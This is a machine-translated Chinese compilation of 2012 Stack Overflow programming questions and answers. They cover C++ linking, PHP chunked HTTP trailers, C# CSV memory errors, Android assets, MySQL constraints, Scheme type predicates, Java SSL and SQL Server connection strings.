# dll - 在 Visual Studio 2010 Express 中链接 libsndfile 时遇到问题

> ID：11820131
> 
> 赞同：2
> 
> 时间：2012-08-05T21:13:49.743
> 
> 标签：dll, linker, visual-studio-express, libsndfile

我第一次尝试使用libsndfile（它是windows 64位版本），在尝试链接时遇到了问题。每当我尝试编译程序时，都会收到此错误：

错误 LNK2019：函数 _main 中引用的未解析的外部符号 _sf_close

到目前为止，这是我尝试将其链接到程序的过程。

在项目属性中，我去了 Config。Prop.-> VC++ 目录，并将头文件的路径添加到包含目录选项卡，将.lib 文件的路径添加到库目录选项卡。

在 C/C++-> General-> Additional Include Directories 中，我添加了头文件的路径。

在 Linker->Input->Additional Dependencies 我添加了 .lib 文件的路径，对我来说是 C:\Program Files\Mega-Nerd\libsndfile\lib\libsndfile-1.lib

我已将#include "sndfile.h" 添加到 .cpp 文件中，但由于某种原因，它似乎无法访问 dll 中的函数。我真的不太了解链接，我所做的只是我从互联网上搜索到的拼凑而成，所以我不确定我做错了什么。任何帮助是极大的赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T13:23:35.850

您可能正在 Visual Studio 中编译一个 32 位项目，并尝试将其与 64 位库链接。它不起作用...下载 libsndfile 的 32 位版本的 windows 二进制文件并使用它链接到您的可执行文件。另一种选择是创建一个 64 位项目，但我认为第一种选择（稍微）更容易。

# javascript - image.link 请帮我理解代码

> ID：11820137
> 
> 赞同：0
> 
> 时间：2012-08-05T21:15:34.280
> 
> 标签：javascript, image, hyperlink

我有以下 javascript 代码

```
if(this.images[index]) {
    var context = this;
    var image = this.images[index];
    var img_container = $(document.createElement('div')).addClass('ad-image');
    var img = $(new Image()).attr('src', image.image);
    if(image.link) {
      var link = $('<a href="'+ image.link +'" target="_blank"></a>');
      link.append(img);
      img_container.append(link);
    } else {
      img_container.append(img);
    } 
```

它有 if(image.link) 条件，我想得到它以便它满足这个条件，但我不知道它正在通过 image.link 检查什么。我应该怎么做才能使 image.link 返回 true？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T21:49:35.390

任何未评估为 的值`false`。在这种特殊情况下，我认为需要一个非空字符串。请参阅[`converting to boolean`](http://jibbering.com/faq/notes/type-conversion/)以更好地理解规则。

# php - 如何在 Apache/PHP 中使用 Trailer 生成块响应？

> ID：11820138
> 
> 赞同：5
> 
> 时间：2012-08-05T21:15:34.983
> 
> 标签：php, apache, http, chunked-encoding

我知道我可以通过`sleep()`在输出中引入 a 来在 PHP 中生成分块响应。

但是是否也可以在 PHP 中生成[***Trailer HTTP 部分？***](https://www.rfc-editor.org/rfc/rfc2616#section-3.6.1)如果没有，在 Apache 2.2 中是否有可能？

我需要它用于测试目的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-15T06:54:02.340

如果发送了标头但未指定标头，PHP 将默认发送分块响应`Content-Length`。如果您熟悉 HTTP 规范，这是唯一合乎逻辑的事情，因为另一端的客户端需要知道您发送的 HTTP 消息何时结束，以便它可以停止读取。

如果要手动执行此操作，则需要...

1.  自己发送适当的标题并调用`flush()`
2.  手动输出分块的 HTTP 消息

因此，您可能会执行以下操作。这个想法是您需要手动发送自己的标头并手动分块您自己的消息。但是，如果您根本不发送`Content-Length`标头，PHP 将默认为您发送分块消息。

```
header("Transfer-encoding: chunked");
header("Trailer: X-My-Trailer-Header");
flush();

echo dechex(strlen($myChunk)) . "\r\n";
echo $myChunk;
echo "\r\n";
flush();

echo "0\r\n";
flush();

echo "X-My-Trailer-Header: some-value\r\n";
flush(); 
```

# macos - 命令“ls”找不到现有文件

> ID：11820139
> 
> 赞同：1
> 
> 时间：2012-08-05T21:15:37.480
> 
> 标签：macos, terminal, printf, ls

我正在尝试清理我的文件名而不实际重命名它们以准备 Mac OS 终端中的“ls -l”。

我正在使用 printf %q 这样的：

ls -l $(printf %q "filenamewithspaceinit")

但是，如果文件名中存在空格（这通常会引发我试图使用此代码更正的错误），则 ls 有胆量使用反斜杠和空格重复确切的文件名，如果我只是自动完成，它将识别shell中带有选项卡的文件名并声称“没有这样的文件或目录”。

我现在对这个命令很生气。我认为 printf 应该产生可导航且正确的文件名。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:26:37.260

省略了，`%q`所以你不会引用它两次？

```
15:23:54-qsario@MacBook-Air:~/test$ ls
foo bar

15:24:01-qsario@MacBook-Air:~/test$ ls -l "$(printf %q 'foo bar')"
ls: foo\ bar: No such file or directory

15:24:04-qsario@MacBook-Air:~/test$ ls -l "$(printf 'foo bar')"
-rw-r--r--  1 qsario  staff  0 Aug  5 15:19 foo bar 
```

# c# - 应用程序中的 OutofMemory 异常

> ID：11820141
> 
> 赞同：0
> 
> 时间：2012-08-05T21:16:16.467
> 
> 标签：c#

在应用程序日志文件中，这是我们得到的错误

> 2012-07-19 15:08:46,995 [17] WARN System.Web.UI.Page [(null)] - Logging:System.OutOfMemoryException: 引发了“System.OutOfMemoryException”类型的异常。在 System.String.GetStringForStringBuilder(String value, Int32 startIndex, Int32 length, Int32 capacity) 在 System.Text.StringBuilder.GetNewString(String currentString, Int32 requiredLength) 在 System.Text.StringBuilder.Append(String value)

任何人都可以建议如何避免这个问题。我们使用字符串生成器将数据写入 excel 工作表

这是代码

```
public void ToCSV(DataTable dt)
{
    StringBuilder sb = null;
    try
    {

        sb = new StringBuilder(50*1024);
        foreach (DataColumn col in dt.Columns)
        {
            sb.Append(col.ColumnName + ",");
        }
        sb.Remove(sb.Length - 1, 1);
        sb.Append(Environment.NewLine);
        foreach (DataRow row in dt.Rows)
        {
            for (int i = 0; i < dt.Columns.Count; i++)
            {
                sb.Append("\"" + row[i].ToString() + "\"" + ",");
            }
            sb.Append(Environment.NewLine);
        }
        Session["exportsCsv"] = sb;
        sb = null;

    }
    catch (Exception ex)
    {
        log4net.Config.XmlConfigurator.Configure();
        log.Warn("Logging:" + ex);

    }
    finally {
        sb = null;

    }
    // 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:22:52.503

```
sb.Append("\"" + row[i].ToString() + "\"" + ","); 
```

===>

```
sb.Append('\"').Append(row[i].ToString()).Append("\","); 
```

尽量不要在一个 StringBuilder 中生成整个 csv 文件，而是写入流。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T01:19:52.457

您要向 CSV 文件添加多少数据？和`String`类`StringBuilder`限制为 2^31-1 (2,147,483,647) 个字符，这可能会受到计算机内存的进一步限制。

要将大量数据写入文件或网络客户端，请将其写入 a `Stream`。

```
public void ToCSV(DataTable dt, Stream outStream)
{ 
    StreamWriter writer = new StreamWriter(outStream); 
    try 
    { 
        bool first = true;
        foreach (DataColumn col in dt.Columns) 
        {
            if (first)
                first = false;
            else
                writer.Write(",");

            writer.Write(col.ColumnName); 
        } 
        writer.WriteLine(); 
        foreach (DataRow row in dt.Rows) 
        { 
            for (int i = 0; i < dt.Columns.Count; i++) 
            { 
                writer.Write("\"" + row[i].ToString() + "\"" + ","); 
            } 
            writer.WriteLine(); 
        } 
        // Not sure what to replace this with:
        //Session["exportsCsv"] = sb; 
    } 
    catch (Exception ex) 
    { 
        log4net.Config.XmlConfigurator.Configure(); 
        log.Warn("Logging:" + ex); 
    } 
} 
```

# android - 如何将资产文件夹中的文件路径传递给文件（字符串路径）？

> ID：11820142
> 
> 赞同：30
> 
> 时间：2012-08-05T21:16:16.900
> 
> 标签：android, xml, file-io, assets

> **可能重复：**
> [Android - 如何从资产中确定特定文件的绝对路径？](https://stackoverflow.com/questions/4744169/android-how-to-determine-the-absolute-path-for-specific-file-from-assets)

我正在尝试将文件传递给 File(String path) 类。有没有办法在资产文件夹中找到文件的绝对路径并将其传递给 File()。我试过`file:///android_asset/myfoldername/myfilename`作为路径字符串，但它没有用。任何的想法？

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2012-08-05T23:12:02.060

AFAIK，您不能`File`从资产文件创建一个，因为它们存储在 apk 中，这意味着没有资产文件夹的路径。

但是，您可以尝试`File`使用缓冲区和[`AssetManager`](http://developer.android.com/reference/android/content/res/AssetManager.html)（它提供对应用程序的原始资产文件的访问）来创建它。

尝试执行以下操作：

```
AssetManager am = getAssets();
InputStream inputStream = am.open("myfoldername/myfilename");
File file = createFileFromInputStream(inputStream);

private File createFileFromInputStream(InputStream inputStream) {

   try{
      File f = new File(my_file_name);
      OutputStream outputStream = new FileOutputStream(f);
      byte buffer[] = new byte[1024];
      int length = 0;

      while((length=inputStream.read(buffer)) > 0) {
        outputStream.write(buffer,0,length);
      }

      outputStream.close();
      inputStream.close();

      return f;
   }catch (IOException e) {
         //Logging exception
   }

   return null;
} 
```

让我知道你的进展。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-05T21:28:06.947

除非您解压缩它们，否则资产将保留在 apk 中。因此，没有可以输入文件的路径。您在问题中给出的路径将适用于/在 WebView 中，但我认为这是 WebView 的特例。

您需要解压缩文件或直接使用它。

如果你有一个 Context，你可以使用`context.getAssets().open("myfoldername/myfilename");`在文件上打开一个 InputStream。使用 InputStream，您可以直接使用它，或者将其写在某个地方（之后您可以将它与 File 一起使用）。

# javascript - 在 node.js 中你如何引用当前目录下的目录

> ID：11820148
> 
> 赞同：0
> 
> 时间：2012-08-05T21:17:25.727
> 
> 标签：javascript, node.js, express

我有一个`/custom_modules/db.js`并且正在尝试，`require`但`/routes/users.js`我不确定如何做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T21:35:30.737

你`./`用来表示你所在的本地目录，并`../`返回一个目录。所以：

```
require('./../custom_modules/db'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T21:50:06.357

应该只使用`../` 示例：

```
var db = require('../custom_modules/db.js'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T21:22:58.383

只需插入前导`/`即可给出绝对路径：

```
require('/custom_modules/db.jpg'); 
```

解析模块路径的规则在[模块](http://nodejs.org/api/modules.html)文档中有详细说明。

# mysql - MySQL 跨表约束

> ID：11820151
> 
> 赞同：1
> 
> 时间：2012-08-05T21:17:38.833
> 
> 标签：mysql, triggers, constraints

我有三个表，表 A 有一个自动递增的唯一主键，另外两个（表 B 和 C）的主键有一个外键约束，将它们与第一个表的主键联系起来。

我想制定一个约束，以保持第二个和第三个表中的所有行不能包含任何重复项，并且对于表 A 中的所有记录，B 或 C 中都有匹配的记录。

所以基本上 A 类型的记录可以是 B 或 C 类型，并且必须是 B 或 C 之一。

是否可以在没有触发器的情况下在 MySQL 中进行此约束？还是需要触发器？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:13:30.537

您可以使用“类型”表：

```
CREATE TABLE Type
  ( type_code CHAR(1) NOT NULL
  , PRIMARY KEY (type_code)
  ) ; 
```

正好有 2 行（与您需要的不同子类型表一样多：

```
INSERT INTO Type (type_code)
VALUES ('B'), ('C') ; 
```

超类型表（包括引用“类型”的列）：

```
CREATE TABLE A
  ( a_id INT NOT NULL AUTO_INCREMENT
  , type_code CHAR(1) NOT NULL
  , PRIMARY KEY (a_id)
  , UNIQUE KEY (type_code, a_id)
  , FOREIGN KEY (type_code)
      REFERENCES Type (type_code)
  ) ; 
```

子类型表（现在引用 A 的主键和 type_code 的组合：

```
CREATE TABLE B
  ( a_id INT NOT NULL
  , type_code CHAR(1) NOT NULL DEFAULT 'B'
  , PRIMARY KEY (type_code, a_id)
  , FOREIGN KEY (type_code, a_id)
      REFERENCES A (type_code, a_id)
  , CHECK (type_code = 'B')
  ) ;

CREATE TABLE C
  ( a_id INT NOT NULL
  , type_code CHAR(1) NOT NULL DEFAULT 'C'
  , PRIMARY KEY (type_code, a_id)
  , FOREIGN KEY (type_code, a_id)
      REFERENCES A (type_code, a_id)
  , CHECK (type_code = 'C')
  ) ; 
```

`CHECK`如果只有 MySQL 实现了约束，上述内容将可以正常工作。但事实并非如此。因此，要绝对确保您的所有规范都得到执行，而不是`'B'`在表中插入类型数据`C`，您必须再添加 2 个“类型”表（并删除 MySQL`CHECK`约束中无用的表）：

```
CREATE TABLE TypeB
  ( type_code CHAR(1) NOT NULL
  , PRIMARY KEY (type_code)
  ) ;

CREATE TABLE TypeC
  ( type_code CHAR(1) NOT NULL
  , PRIMARY KEY (type_code)
  ) ; 
```

每行恰好有 1 行：

```
INSERT INTO TypeB (type_code)
VALUES ('B') ;

INSERT INTO TypeC (type_code)
VALUES ('C') ; 
```

和额外的 FK：

```
ALTER TABLE B
  ADD FOREIGN KEY (type_code)
    REFERENCES TypeB (type_code) ;

ALTER TABLE C
  ADD FOREIGN KEY (type_code)
    REFERENCES TypeC (type_code) ; 
```

有了这些约束，表 A 的每一行都将属于 B 或 C 类型，并且将在相应的表（B 或 C）中，并且永远不会在两者中。

如果您还想确保它们恰好在一个表中（并且从不在 B 或 C 中），则在插入 A 时应注意这一点（所有插入都应通过强制执行该要求的事务完成）。

# java - Java ArrayList 空指针

> ID：11820157
> 
> 赞同：0
> 
> 时间：2012-08-05T21:18:14.953
> 
> 标签：java, arraylist, nullpointerexception, bufferedimage

**更新**我找到了解决方案：D 感谢您的回复，但没有一个是真正的问题。我的问题是在将图像添加到 ArrayList 之后，我正在初始化图像。

所以我有一个名为 Tile 的类：

```
public class Tile {
BufferedImage img;
int x,y;

public Tile(BufferedImage image, int x, int y)
{
    this.x = x;
    this.y = y;
    this.img = image;
}

public int getX(){
    return x;
}
public int getY(){
    return y;
}
public BufferedImage getImage(){
    return img;
}
} 
```

然后我有一个类，其中包含名为 DATA_IMAGES 的图像变量：

```
public class DATA_IMAGES {
//terrain
public static BufferedImage SNOW;
public static BufferedImage GRASS;
public static BufferedImage CAVE;

//Entities
public static BufferedImage TREE;
public static BufferedImage player;
public static int frame = 1;
public static void initImages(){
    try {
        player = ImageIO.read(new File("res/images/player/f1.png"));
    } catch (IOException e) {
        JOptionPane.showMessageDialog(null,"Can't Load Images "+e.getMessage(),"Fatal Error",JOptionPane.ERROR_MESSAGE);
        System.exit(0);
    }
    try{
    //SNOW = new ImageIcon("res/images/snow.png").getImage();
    //CAVE = new ImageIcon("res/images/snow.png").getImage();
    GRASS = ImageIO.read(new File("res/images/grass.png"));

    TREE = ImageIO.read(new File("res/images/tree.png"));
    }catch(Exception ex){
        JOptionPane.showMessageDialog(null,"Can't Load Images","Fatal Error",JOptionPane.ERROR_MESSAGE);
        System.exit(0);
    }

}
} 
```

所以当我测试这个时，我有一个名为 Main 的类：

```
public class Main extends JFrame {
private static final long serialVersionUID = 6149918602875295087L;
public static void main(String args[]){
    new Main();
}
TileHelper tiles = new TileHelper(TileHelper.MAIN_LIST);
public Main(){
    TileHelper.MAIN_LIST.add(new Tile(DATA_IMAGES.GRASS,100,100));
    DATA_IMAGES.initImages();
    setSize(640,480);
    setResizable(false);
    setTitle("Stranded");
    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    setLocationRelativeTo(null);

    setVisible(true);

    createBufferStrategy(2);
    GameLoop();
}
public void GameLoop(){
    Thread gameloop = new Thread(){
        public void run(){
            while(true){
                RenderInit();
                try {
                    Thread.sleep(30);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    };
    gameloop.start();
}
public void RenderInit(){
    BufferStrategy buff = getBufferStrategy();
    Graphics g = buff.getDrawGraphics();

    g.clearRect(0, 0, getWidth(), getHeight());
    g.drawString("COOL TEXT", 100, 100);

    Render(g);

    g.dispose();
    buff.show();
    Toolkit.getDefaultToolkit().sync();
}
public void Render(Graphics g){
    tiles.RenderAll(g);
}

} 
```

然后你可能会注意到还有一个 TileHelper 类：

```
public class TileHelper {
ArrayList<Tile> list;
//Main list for adding tiles
public static ArrayList<Tile> MAIN_LIST = new ArrayList<Tile>();

public TileHelper(ArrayList<Tile> list){
    this.list = list;
}

public void RenderAll(Graphics g){
    for(int i = 0; i < list.size(); i++){
        Tile t = new Tile(list.get(i).getImage(), list.get(i).getX(),list.get(i).getY());
        g.drawImage(list.get(i).getImage(),t.getX(),t.getY(),null);
        System.out.println(t.getX()+"  "+t.getY() + list.get(i).getImage().getHeight());
    }
}
} 
```

当您仔细观察时，您会看到我打印出 x 值、y 值和图像高度。我不断收到一个空指针，因为由于某种原因没有设置 BufferedImage？

**问题**如何解决这个问题，以便识别 BufferedImage 并且我没有得到空指针。

这是错误，以防万一您需要它...

```
Exception in thread "Thread-3" java.lang.NullPointerException
at com.survivalpixel.stranded.TileHelper.RenderAll(TileHelper.java:19)
at com.survivalpixel.stranded.Main.Render(Main.java:60)
at com.survivalpixel.stranded.Main.RenderInit(Main.java:53)
at com.survivalpixel.stranded.Main$1.run(Main.java:35) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T21:28:19.767

```
public Main(){
    TileHelper.MAIN_LIST.add(new Tile(DATA_IMAGES.GRASS,100,100));
    DATA_IMAGES.initImages();
    // ... 
```

您需要交换这两行。`DATA_IMAGES.GRASS`还在`null`打电话之前`initImages()`。

（说真的，如果您只是在构造函数的开头放置一个断点并逐步执行它，您会很容易理解这一点。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-05T21:29:38.507

`DATA_IMAGES.GRASS`将其添加到 TileHelper.MAIN_LIST 时为 null。

您只需在添加 GRASS 图像后调用 DATA_IMAGE.initImages() ，因此在添加 GRASS 图像时它为空。

```
DATA_IMAGES.initImages();
TileHelper.MAIN_LIST.add(new Tile(DATA_IMAGES.GRASS,100,100)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T21:30:45.487

`initImages`如果是静态初始化块而不是函数，您可能会更好。因为你需要确保在使用它初始化的变量之前调用它。你检查过是这样的吗？

# types - 如何在 Scheme 中定义类型谓词

> ID：11820162
> 
> 赞同：5
> 
> 时间：2012-08-05T21:19:14.840
> 
> 标签：types, scheme, racket, predicate

“普通”函数通常只在给定类型的对象域上定义，但某些函数，例如 Scheme 类型谓词`list?`或`procedure?`，是为任何类型的参数定义的，甚至可以应用于它们自己。所以 eg`(list? procedure?)`评估为`#f`并`(procedure? procedure?)`评估为`#t`。我试图弄清楚如何编写此类完全定义的函数，但无法找到讨论此问题的来源。

例如，假设我们使用以下构造函数和选择器实现[了计算机程序的结构和解释的练习 2.4 中描述的对数据类型：](http://mitpress.mit.edu/sicp/full-text/book/book-Z-H-14.html#%_sec_2.1.3)

```
 (define (cons x y)
      (lambda (m) (m x y)))

    (define (car z)
      (z (lambda (p q) p)))

    (define (cdr z)
      (z (lambda (p q) q))) 
```

然后我将如何定义一个谓词，该谓词`pair?`返回`#t`使用 构造的任何东西`cons`，以及`#f`任何不是的东西？`list?`更一般地说，类型谓词是如何`procedure?`实现的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-06T12:51:29.820

这很容易。重新定义您的过程以使第一个参数成为您正在创建的对象的类型：

```
(define +type-pair+ 'pair)
(define +type-number+ 'number)

(define (cons a d)
  (lambda (m) (m +type-pair+ a d)))

(define (type x)
  (x (lambda (t . rest) t)))

(define (pair? c)
  (eq? (type c) +type-pair+))

(define (car c)
  (if (pair? c)
      (c (lambda (t a d) a))
  (error "Argument is not pair!")))

(define (cdr c)
  (if (pair? c)
      (c (lambda (t a d) d))
  (error "Argument is not pair!")))

(define (number? c)
   (if (type c) +type-number+)) 
```

您可以使用它来定义您的语言中的所有内容，甚至是程序，但所有程序都必须支持使用 (type x) 为其指定类型，并且所有使用某些内容的程序必须确保类型正确。将对实现为闭包可能是最慢的方法，因此这只是 SICP 思想实验，让您了解闭包是什么。Arc 对所有数据类型都使用标签，但将数据保留为数据。您应该看看 Arc 以了解标记如何成为一种方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-06T22:58:06.773

顺便说一句，在 Racket 中，用[struct](http://docs.racket-lang.org/guide/define-struct.html)制作的结构谓词已经为您完成了这项工作，因此您不必手动实现它。

每个专业级别的方案都通过结构或记录提供类似的功能。请参阅[SRFI-9](http://srfi.schemers.org/srfi-9/srfi-9.html)，其中描述了许多其他 Scheme 实现已经为您做的事情。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T22:50:34.300

你不能，用你展示的代码。程序是不透明的。

作为一种可能性，您必须更改构造函数/访问器以使用*标记列表。*

```
(define *church-pair-tag* (list '*church-pair-tag*))

(define (cons x y)
   (cons *church-pair-tag* (lambda(m) (m x y))))

(define (church-pair? x)
   (and (pair? x) 
        (eq? *church-pair-tag* (car x))
        (procedure? (cdr x))))

.... 
```

但这显然不是万无一失的。

谓词`pair?`和`procedure?`是内置的，可能是通过某种底层魔法实现的。`list?`可以用`pair?`、null?`car`和来实现`cdr`。

# amazon-s3 - JetS3t 客户端 putObject 停止使用 HTTPS 主机名无效异常

> ID：11820166
> 
> 赞同：0
> 
> 时间：2012-08-05T21:19:50.393
> 
> 标签：amazon-s3, amazon-web-services, openssl, jets3t

基本 put 对象调用突然停止工作（有时会成功）。它已经工作了很长时间。

看起来像 SSL 证书问题。

堆栈跟踪片段。

```
 org.jets3t.service.S3ServiceException: S3 PUT connection failed for '/s3_request_message-38afbd8e-7d65-428a-a708-5d34104ded95-4912660956668093023.xml'
            at org.jets3t.service.impl.rest.httpclient.RestS3Service.performRequest(RestS3Service.java:516)
            at org.jets3t.service.impl.rest.httpclient.RestS3Service.performRestPut(RestS3Service.java:800)
            at org.jets3t.service.impl.rest.httpclient.RestS3Service.createObjectImpl(RestS3Service.java:1399)
            at org.jets3t.service.impl.rest.httpclient.RestS3Service.putObjectImpl(RestS3Service.java:1317)
            at org.jets3t.service.S3Service.putObject(S3Service.java:1661)
            at org.jets3t.service.S3Service.putObject(S3Service.java:1914)
            at com.amazon.lm.utils.aws.S3Box.putFile(S3Box.java:111)
            at com.amazon.lm.engine.LMEngine.copyRequestS3(LMEngine.java:350)
            at com.amazon.lm.engine.LMEngine.run(LMEngine.java:165)
            at com.amazon.lm.engine.discover.DiscoveryEngine.run(DiscoveryEngine.java:156)
            at com.amazon.lm.engine.discover.GoogleBaseSearch.run(GoogleBaseSearch.java:25)
            at com.amazon.lm.ui.UIDiscoverTask.run(UIDiscoverTask.java:41)
            at java.lang.Thread.run(Thread.java:662)
    Caused by: javax.net.ssl.SSLPeerUnverifiedException: HTTPS hostname invalid: expected 'lm-requests-prod.s3.amazonaws.com', received '*.s3.amazonaws.com'
            at org.apache.commons.httpclient.contrib.ssl.StrictSSLProtocolSocketFactory.verifyHostname(StrictSSLProtocolSocketFactory.java:293)
            at org.apache.commons.httpclient.contrib.ssl.StrictSSLProtocolSocketFactory.createSocket(StrictSSLProtocolSocketFactory.java:215)
            at org.apache.commons.httpclient.HttpConnection.open(HttpConnection.java:707)
            at org.apache.commons.httpclient.MultiThreadedHttpConnectionManager$HttpConnectionAdapter.open(MultiThreadedHttpConnectionManager.java:1361)
            at org.apache.commons.httpclient.HttpMethodDirector.executeWithRetry(HttpMethodDirector.java:387)
            at org.apache.commons.httpclient.HttpMethodDirector.executeMethod(HttpMethodDirector.java:171)
            at org.apache.commons.httpclient.HttpClient.executeMethod(HttpClient.java:397)
            at org.apache.commons.httpclient.HttpClient.executeMethod(HttpClient.java:323)
            at org.jets3t.service.impl.rest.httpclient.RestS3Service.performRequest(RestS3Service.java:342)
            ... 12 more 
```

看起来 Java 不喜欢显示为“*.s3.amazonaws.com”的通配符域

per [Can Java connect to wildcard ssl](https://stackoverflow.com/questions/3166373/can-java-connect-to-wildcard-ssl) ... 通配符对 java 来说可能有问题。

但是如前所述，我们已经使用了很长时间，突然开始面临这个问题，太断断续续了。

我们正在使用以下版本：

```
jdk: 1.6 
jets3: 0.7
openssl:1.0 
```

有没有人遇到过这个问题？如果是，是否有任何解决方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T15:26:16.070

这`wasn't an issue with the AWSS3JavaClient code`是基于这个问题发生在 S3 库和其他 Java S3 库中的事实，`SSL cert verification is done inside the JVM platform library code`以及不在我们的 S3 库代码中的事实。

问题是我们的 JVM 的密钥库没有最新的证书颁发机构 (CA) 允许 JVM 为我们从 S3 SSL 端点获得的任何证书形成信任链。这是 Java 和 SSL 的一个相当普遍的问题，因为 JVM 维护它自己的密钥库（即它不使用来自操作系统的证书）。

如果您遇到此问题，请尝试使用其他 JVM 重现此问题。每当客户过去看到此问题时，都是因为他们的本地`JVM keystore`（密钥库随 JVM 一起提供并包含最新的证书和 CA）已经过时。升级到最新的 JVM 版本在过去总是解决这个问题。

尝试将您的升级`JVM version`到最新版本，这应该会有所帮助，因为您的密钥库必须已过期！:)

# c# - 错误：26 - 查找指定的服务器/实例时出错。（无法从我的主机服务器连接到我的本地数据库）

> ID：11820168
> 
> 赞同：1
> 
> 时间：2012-08-05T21:20:06.903
> 
> 标签：c#, asp.net, sql-server, sql-server-2008, web-config

我之前已经问过这个问题，但没有任何好的回应，我的问题是我的 app_data 文件夹中有一个本地数据库（aspnetdb.mdf），这是 web.config 中的连接字符串：

```
<add name="ApplicationServices" 
     connectionString="data source=.\SQLEXPRESS;Integrated Security=SSPI;AttachDBFilename=|DataDirectory|\aspnetdb.mdf;User Instance=true" 
     providerName="System.Data.SqlClient" /> 
```

所以我的站点在我的本地 iis 服务器上运行良好，但是当我将站点放在我的主机服务器中时，我收到此错误消息：建立与 SQL Server 的连接时发生网络相关或特定于实例的错误。服务器未找到或无法访问。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。（提供者：SQL 网络接口，错误：26 - 错误定位服务器/指定的实例）。

在另一台服务器中，我有 sql server 2008（接受远程连接，并且我有相同的实例名称 SQLEXPRESS）。我真的尽我所能尝试了一切，但没有任何好的结果。我将非常感谢您的帮助，谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-05T21:25:11.923

此格式表示本地连接：

```
.\SQLEXPRESS 
```

在另一台服务器上，您需要指定服务器名称或 IP 地址，例如：

```
192.168.1.205\SQLEXPRESS
YOURMACHINE\SQLEXPRESS 
```

您还需要验证该实例是否为 SQL Server Express。从[您的其他几乎相同的问题](https://stackoverflow.com/questions/11820168/error-26-error-locating-server-instance-specified-cant-connect-to-my-local)来看，它看起来像一个默认实例。

您还应该停止使用这种愚蠢的用户实例 / attachDbFilename 技术。将数据库正确附加到实例，然后`Initial Catalog=aspnetdb;`在连接字符串中引用逻辑数据库名称。由于多种原因，此用户实例功能已被弃用，这当然是其中之一。

当然，可能还有其他网络问题会阻止这种情况，例如，如果服务器位于不同的域中，有防火墙设置干扰等。但是您的其他服务器将永远无法使用点访问您的机器服务器名称。

**编辑**提供婴儿步骤，因为显然我的建议没有被遵循。假设您实际上已在新服务器上附加了 aspnetdb 数据库，请尝试以下操作：

```
 connectionString="data source=192.168.85.124\SQLEXPRESS;
   Integrated Security=SSPI;
   Initial Catalog=aspnetdb;" 
```

如果您毕竟没有使用 SQL Express 命名实例，请尝试：

```
 connectionString="data source=192.168.85.124;
   Integrated Security=SSPI;
   Initial Catalog=aspnetdb;" 
```

对于 SQL 身份验证，请使用您在 Management Studio 中使用的相同用户名/密码：

```
 connectionString="data source=192.168.85.124;
   User ID=username; Password=password;
   Initial Catalog=aspnetdb;" 
```

这是故障排除 101 的东西。如果你仍然不能让它工作，你可能需要聘请一名顾问 10 分钟来为你修复它，因为你无法弄清楚你做了什么以及为什么你不能让它工作。

# c# - 许多 IF 语句与代表？

> ID：11820169
> 
> 赞同：2
> 
> 时间：2012-08-05T21:20:10.500
> 
> 标签：c#, performance, if-statement, delegates, xna

一遍又一遍地使用 if 语句，或者使用它们一次并使用委托来根据 IF 语句的输出调用函数会更好吗？我想说答案显然是委托，但我不确定一遍又一遍地使用不同的方法是否比许多执行相同操作的 IF 语句更快或更慢。我希望我解释得对。

PS 如果重要的话，我需要知道的框架是 XNA。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:33:48.960

你有你的权衡。最好的答案已经被评论了，那就是对两者进行分析，然后弄清楚。IF 语句可能会占用更多 CPU，因为它必须一次又一次地进行比较。另一方面，使用委托会占用更多内存，这是您需要保留的另一个对象。

就我个人而言，我最喜欢做的事情（如果适用，不知道你问题的完整背景）是将你的 IF ELSE 语句变成一个 switch-case。这对于状态机和其他重复过程非常有效，而且您消除了 IF 附带的所有分支。但是，这是假设您正在检查的值都在范围内相对接近，否则您会给编译器带来很多痛苦。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T21:34:00.600

当然，这是一种有用的技术。显然，只有少数 if 的委托是没有意义的，因为它们成本高昂且 CPU 无法轻松预测分支目标。对于很多人来说，一次性初始化的委托是有意义的。

目前尚不清楚盈亏平衡点在哪里。那是需要测量的。

# java - 这个 java 应用程序可以在 Heroku 上运行吗？

> ID：11820173
> 
> 赞同：2
> 
> 时间：2012-08-05T21:20:30.783
> 
> 标签：java, tomcat, maven, heroku, java-metro-framework

我没有设置 java 应用程序的经验，也没有使用 Heroku 的经验，但是我有这个 java 应用程序我想知道我是否可以轻松地在 Heroku 上运行。

[https://github.com/difi/oxalis](https://github.com/difi/oxalis)是 github 存储库，这里是独立服务器的一些安装说明：

*   确保已安装 Maven。
*   确保已安装 Tomcat 7 和 Metro 2.1.1
*   使用用户管理器/管理器确保 Tomcat 管理器在端口 8080 上可用
*   确保 Tomcat 也在 localhost:8443 的 SSL 上启动并运行
*   确保 keystore.jks 安装在已知目录中（构建密钥库的单独说明）
*   更改 oxalis-commons/src/main/filters/soc.properties 以反映您的本地偏好

这可以在 Heroku 上设置吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T14:45:58.527

